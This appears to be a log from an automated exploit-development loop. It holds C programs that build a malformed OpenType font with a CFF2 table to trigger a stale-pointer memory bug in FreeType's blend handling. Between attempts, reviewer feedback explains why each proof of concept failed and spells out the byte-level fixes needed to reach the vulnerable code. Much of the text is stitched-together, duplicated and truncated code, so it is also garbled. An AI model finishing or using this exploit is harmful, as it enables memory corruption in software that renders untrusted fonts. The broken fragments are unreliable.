    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) return 1;

    /* SFNT header: OTTO */
    fputc('O', f); fputc('T', f); fputc('T', f); fputc('O', f);
    w16(f, 8); w16(f, 128); w16(f, 3); w16(f, 0);

    long dir_start = ftell(f);
    int i;
    for (i = 0; i < 8; i++) {
        fputc(0, f); fputc(0, f); fputc(0, f); fputc(0, f);
        w32(f, 0); w32(f, 0); w32(f, 0);
    }

    long table_offsets[8];
    long table_lengths[8];
    const char *tags[8] = {"head", "hhea", "maxp", "OS/2", "hmtx", "name", "cmap", "CFF2"};

    /* 1. head table (54 bytes) */
    table_offsets[0] = ftell(f);
    w32(f, 0x00010000); w32(f, 0x00010000); w32(f, 0); w32(f, 0x5F0F3CF5);
    w16(f, 0); w16(f, 1000); w32(f, 0); w32(f, 0);
    w16(f, 0); w16(f, 0); w16(f, 0); w16(f, 0);
    w16(f, 0); w16(f, 2); w16(f, 0); w16(f, 0); w16(f, 0);
    table_lengths[0] = ftell(f) - table_offsets[0];

    /* 2. hhea table (36 bytes) */
    table_offsets[1] = ftell(f);
    w32(f, 0x00010000); w16(f, 0); w16(f, 0); w16(f, 0);
    w16(f, 0); w16(f, 0); w16(f, 0); w16(f, 0);
    w16(f, 0); w16(f, 0); w16(f, 0);
    w16(f, 0); w16(f, 0); w16(f, 0); w16(f, 0); w16(f, 0);
    w16(f, 0); w16(f, 1);
    table_lengths[1] = ftell(f) - table_offsets[1];

    /* 3. maxp table (6 bytes) */
    table_offsets[2] = ftell(f);
    w32(f, 0x00005000); w16(f, 1);
    table_lengths[2] = ftell(f) - table_offsets[2];

    /* 4. OS/2 table (78 bytes) */
    table_offsets[3] = ftell(f);
    w16(f, 4); w16(f, 0); w16(f, 0); w16(f, 0); w16(f, 0);
    w16(f, 0); w16(f, 0); w16(f, 0); w16(f, 0);
    w16(f, 0); w16(f, 0); w16(f, 0); w16(f, 0);
    w16(f, 0); w16(f, 0); w16(f, 0);
    fputc(0, f); fputc(0, f); fputc(0, f); fputc(0, f);
    fputc(0, f); fputc(0, f); fputc(0, f); fputc(0, f);
    fputc(0, f); fputc(0, f);
    w32(f, 0); w32(f, 0); w32(f, 0); w32(f, 0);
    fputc('N', f); fputc('O', f); fputc('N', f); fputc('E', f);
    w16(f, 0); w16(f, 0); w16(f, 0);
    w16(f, 0); w16(f, 0); w16(f, 0);
    w16(f, 0); w16(f, 0);
    w32(f, 0); w32(f, 0);
    w16(f, 0); w16(f, 0); w16(f, 0); w16(f, 0); w16(f, 0);
    table_lengths[3] = ftell(f) - table_offsets[3];

    /* 5. hmtx table (4 bytes) */
    table_offsets[4] = ftell(f);
    w16(f, 0); w16(f, 0);
    table_lengths[4] = ftell(f) - table_offsets[4];

    /* 6. name table (6 bytes) */
    table_offsets[5] = ftell(f);
    w16(f, 0); w16(f, 0); w16(f, 0);
    table_lengths[5] = ftell(f) - table_offsets[5];

    /* 7. cmap table (format 4 with 1 segment) */
    table_offsets[6] = ftell(f);
    w16(f, 0); w16(f, 1); w16(f, 3); w16(f, 1);
    w32(f, 12);
    w16(f, 4); w16(f, 24); w16(f, 0);
    w16(f, 4); w16(f, 2); w16(f, 1); w16(f, 0);
    w16(f, 0xFFFF); w16(f, 0); w16(f, 0); w16(f, 0); w16(f, 0);
    table_lengths[6] = ftell(f) - table_offsets[6];

    /* 8. CFF2 table */
    table_offsets[7] = ftell(f);
    long cff_start = ftell(f);

    /* CFF2 Header */
    fputc(0x02, f); fputc(0x00, f); fputc(0x05, f);
    long topdict_len_pos = ftell(f);
    w16(f, 0);

    /* Top DICT - no maxstack (CFF2 ignores it) */
    long td_start = ftell(f);
    fputc(0x1C, f); w16(f, 0); fputc(0x18, f); /* vstore */
    fputc(0x1C, f); w16(f, 0); fputc(0x11, f); /* FDArray */
    fputc(0x1C, f); w16(f, 0); fputc(0x12, f); /* CharStrings */
    fputc(0x0D, f);
    long td_end = ftell(f);
    long td_len = td_end - td_start;
    fseek(f, topdict_len_pos, SEEK_SET);
    w16(f, (uint16_t)td_len);
    fseek(f, td_end, SEEK_SET);

    /* Global Subr INDEX (empty) */
    w32(f, 0);

    /* VariationStore */
    long vstore_start = ftell(f);
    w16(f, 1);
    long vrl_off_pos = ftell(f); w32(f, 0);
    w16(f, 1);
    long ivd_off_pos = ftell(f); w32(f, 0);
    long vrl_start = ftell(f);
    w16(f, 1); w16(f, 1);
    w16(f, 0); w16(f, 0x4000); w16(f, 0x7FFF);
    long ivd_start = ftell(f);
    w16(f, 1); w16(f, 0); w16(f, 1); w16(f, 0); w16(f, 0);
    fseek(f, vrl_off_pos, SEEK_SET); w32(f, (uint32_t)(vrl_start - vstore_start));
    fseek(f, ivd_off_pos, SEEK_SET); w32(f, (uint32_t)(ivd_start - vstore_start));
    fseek(f, ivd_start + 10, SEEK_SET);

    /* FDArray INDEX */
    long fdarr_start = ftell(f);
    w32(f, 1); fputc(0x01, f); fputc(0x01, f);
    long fdarr_off1 = ftell(f); fputc(0, f);
    long fd_start = ftell(f);
    fputc(0x1C, f); w16(f, 0); /* priv size */
    fputc(0x1C, f); w16(f, 0); /* priv offset */
    fputc(0x12, f); /* Private operator */
    fputc(0x0D, f);
    long fd_len = ftell(f) - fd_start;
    fseek(f, fdarr_off1, SEEK_SET); fputc((uint8_t)(fd_len + 1), f);
    fseek(f, fd_start + fd_len, SEEK_SET);

    /* Private DICT - first blend small, second blend large to force realloc */
    long priv_start = ftell(f);
    fputc(0x1C, f); w16(f, 0); fputc(0x16, f); /* vsindex */
    /* First blend: numBlends=1, 5 values, then blend */
    int j;
    for (j = 0; j < 5 * 1; j++) {
        fputc(0x1C, f); w16(f, 0);
    }
    fputc(0x1C, f); w16(f, 1);
    fputc(0x17, f); /* blend */
    /* Second blend: numBlends=50, 250 values, then blend - triggers realloc */
    for (j = 0; j < 5 * 50; j++) {
        fputc(0x1C, f); w16(f, 0);
    }
    fputc(0x1C, f); w16(f, 50);
    fputc(0x17, f); /* blend */
    fputc(0x0D, f);
    long priv_len = ftell(f) - priv_start;
    long priv_off = priv_start - cff_start;

    /* Patch Font DICT */
    fseek(f, fd_start + 1, SEEK_SET); w16(f, (uint16_t)priv_len);
    fseek(f, fd_start + 4, SEEK_SET); w16(f, (uint16_t)priv_off);

    /* Patch Top DICT offsets */
    long vstore_off = vstore_start - cff_start;
    long fdarr_off = fdarr_start - cff_start;
    long cs_start = ftell(f); w32(f, 0);
    long cs_off = cs_start - cff_start;
    fseek(f, td_start + 4, SEEK_SET); w16(f, (uint16_t)vstore_off);
    fseek(f, td_start + 7, SEEK_SET); w16(f, (uint16_t)fdarr_off);
    fseek(f, td_start + 10, SEEK_SET); w16(f, (uint16_t)cs_off);

    table_lengths[7] = ftell(f) - table_offsets[7];

    /* Patch table directory */
    fseek(f, dir_start, SEEK_SET);
    for (i = 0; i < 8; i++) {
        fputc(tags[i][0], f); fputc(tags[i][1], f); fputc(tags[i][2], f); fputc(tags[i][3], f);
        w32(f, 0);
        w32(f, (uint32_t)table_offsets[i]);
        w32(f, (uint32_t)table_lengths[i]);
    }

    fclose(f);
    return 0;
}

**Feedback to next attempt:**
```
The PoC executed but did not trigger the vulnerability.
Senior Engineer Analysis:
**Final Analysis**

The PoC failed to reach the vulnerable code path because the **blend operator byte is incorrect**. The generator used `0x17` (decimal 23) to represent the blend operator, but the CFF2 specification defines the blend operator as **0x11** (decimal 17). In the FreeType CFF parser, the operator `0x11` is recognized and dispatched to `cff_parse_blend`, which then calls `cff_blend_doBlend`. Using `0x17` results in an unrecognized operator; the parser either skips it or generates an error, so the blend path is never executed, and no reallocation of `blend_stack` occurs.

**Required change** (single byte in the Private DICT):

- In the Private DICT, the two `fputc(0x17, f);` lines (the blend operators) must be changed to `fputc(0x11, f);`.

All other structure (SFNT header, table offsets, CFF2 Top DICT, VariationStore, FDArray, CharStrings, Private DICT with vsindex and blend arguments) remains valid. The first blend (numBlends=1) will succeed; the second blend (numBlends=50) will trigger the `FT_REALLOC` that leads to the stale pointer vulnerability in `cff_blend_doBlend`.

=== CRITIQUE REQUIRED ===
Before writing the updated C code, you MUST write a short paragraph of analysis. Read the fuzzer output provided above and explain EXACTLY why the previous payload was rejected or failed to reach the vulnerable code. State your new strategy clearly, and THEN output the C code.
```

#include <stdlib.h>

static void w16(FILE *f, uint16_t v) {
    fputc((v>>8)&0xFF, f); fputc(v&0xFF, f);
}
static void w32(FILE *f, uint32_t v) {
    fputc((v>>24)&0xFF, f); fputc((v>>16)&0xFF, f);
    fputc((v>>8)&0xFF, f); fputc(v&0xFF, f);
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) return 1;

    /* SFNT header: OTTO */
    fputc('O', f); fputc('T', f); fputc('T', f); fputc('O', f);

#include <stdint.h>
#include <stdlib.h>

static void w16(FILE *f, uint16_t v) {
    fputc((v>>8)&0xFF, f); fputc(v&0xFF, f);
}
static void w32(FILE *f, uint32_t v) {
    fputc((v>>24)&0xFF, f); fputc((v>>16)&0xFF, f);
    fputc((v>>8)&0xFF, f); fputc(v&0xFF, f);
}

int main(void) {

    if (!f) return 1;

    fseek(f, ivd_off_pos, SEEK_SET); w32(f, (uint32_t)(ivd_start - vstore_start));
    fseek(f, ivd_start + 10, SEEK_SET);

    /* FDArray INDEX */

    w32(f, 1); fputc(0x01, f); fputc(0x01, f);
    long fdarr_off1 = ftell(f); fputc(0, f);
    long fd_start = ftell(f);
    fputc(0x1C, f); w16(f, 0); /* priv size */
    fputc(0x1C, f); w16(f, 0); /* priv offset */
    fputc(0x12, f); /* Private operator */
    fputc(0x0D, f);
    long fd_len = ftell(f) - fd_start;
    fseek(f, fdarr_off1, SEEK_SET); fputc((uint8_t)(fd_len + 1), f);
    fseek(f, fd_start + fd_len, SEEK_SET);

    /* Private DICT */
    long priv_start = ftell(f);
    fputc(0x1C, f); w16(f, 0); fputc(0x16, f); /* vsindex */
    /* First blend: numBlends=1 */
    int j;
    for (j = 0; j < 5 * 1; j++) {
        fputc(0x1C, f); w16(f, 0);
    }
    fputc(0x1C, f); w16(f, 1);
    fputc(0x0C, f); fputc(0x1A, f); /* blend operator (CFF2: 0x0C 0x1A) */

    for (j = 0; j < 5 * 50; j++) {
        fputc(0x1C, f); w16(f, 0);
    }
    fputc(0x1C, f); w16(f, 50);
    fputc(0x0C, f); fputc(0x1A, f); /* blend operator (CFF2: 0x0C 0x1A) */
    fputc(0x0D, f);
    long priv_len = ftell(f) - priv_start;
    long priv_off = priv_start - cff_start;

    /* Patch Font DICT */
    fseek(f, fd_start + 1, SEEK_SET); w16(f, (uint16_t)priv_len);
    fseek(f, fd_start + 4, SEEK_SET); w16(f, (uint16_t)priv_off);

    /* Patch Top DICT offsets */
    long vstore_off = vstore_start - cff_start;
    long fdarr_off = fdarr_start - cff_start;
    long cs_start = ftell(f); w32(f, 0);
    long cs_off = cs_start - cff_start;

    fseek(f, td_start + 7, SEEK_SET); w16(f, (uint16_t)fdarr_off);
    fseek(f, td_start + 10, SEEK_SET); w16(f, (uint16_t)cs_off);

    table_lengths[7] = ftell(f) - table_offsets[7];

    /* Patch table directory */
    fseek(f, dir_start, SEEK_SET);
    for (i = 0; i < 8; i++) {

        w32(f, 0);
        w32(f, (uint32_t)table_offsets[i]);
        w32(f, (uint32_t)table_lengths[i]);
    }

**Feedback to next attempt:**
```
The PoC executed but did not trigger the vulnerability.
Senior Engineer Analysis:
**Root Cause:**  
The FDArray INDEX in the CFF2 table is malformed, causing the FreeType parser to fail before reaching the Private DICT (where the blend operators reside). The PoC wrote only one offset byte for a count‑1 INDEX, but the CFF INDEX specification requires **N+1** offsets (two offsets for N=1). The missing offset (the second, which should be `1 + fd_len`) forces an early parse error, so `cff_parse_blend` and the vulnerable `cff_blend_doBlend` are never called.

**Confirmed constants:**  
- `CFF2_DEFAULT_STACK` confirmed as `193`.

**Exact structural changes required:**

1. **FDArray INDEX generation (byte offsets from `fdarr_start`):**  
   - `fdarr_start+0` .. `fdarr_start+3`: Count = 1 → `0x00000001` (big‑endian)  
   - `fdarr_start+4`: offSize = 1 → `0x01`  
   - `fdarr_start+5`: First offset = 1 → `0x01`  
   - `fdarr_start+6`: Second offset = `1 + fd_len` → write the byte value `(uint8_t)(1 + fd_len)`  
   - `fdarr_start+7` .. `fdarr_start+7+fd_len-1`: The Font DICT data (the sequence `0x1C, w16(privSize), 0x1C, w16(privOffset), 0x12, 0x0D`).  

   After writing the FD data (length `fd_len`), **no patching** of the offset is needed because it is already correct.

2. **Private DICT patching (inside the FD data):**  
   - At `fd_start+1`: write `priv_len` as a 2‑byte big‑endian value.  
   - At `fd_start+4`: write `priv_off` (private dict offset relative to CFF2 table start) as a 2‑byte big‑endian value.

3. **Top DICT offset patching (unchanged in principle but verify positions):**  
   - `vstore_off`, `fdarr_off`, and `cs_off` are written at `td_start+4`, `td_start+7`, `td_start+10` respectively. These remain correct if the CFF2 data size and offsets are recalculated.

**Why this reaches the vulnerability:**  
With a correctly formed FDArray INDEX, the parser loads the Private DICT, encounters the `vsindex` operator (sets `priv->vsindex=0`), then the first blend operator (`numBlends=1`, causing a small `FT_REALLOC` of the blend stack), and finally the second blend operator (`numBlends=50`). The second call to `cff_blend_doBlend` triggers the reallocation condition (`blend_used + size > blend_alloc`), and the `FT_REALLOC` moves the blend buffer without updating the stale `parser->stack` entries – exactly the described vulnerability.

=== CRITIQUE REQUIRED ===
Before writing the updated C code, you MUST write a short paragraph of analysis. Read the fuzzer output provided above and explain EXACTLY why the previous payload was rejected or failed to reach the vulnerable code. State your new strategy clearly, and THEN output the C code.
```
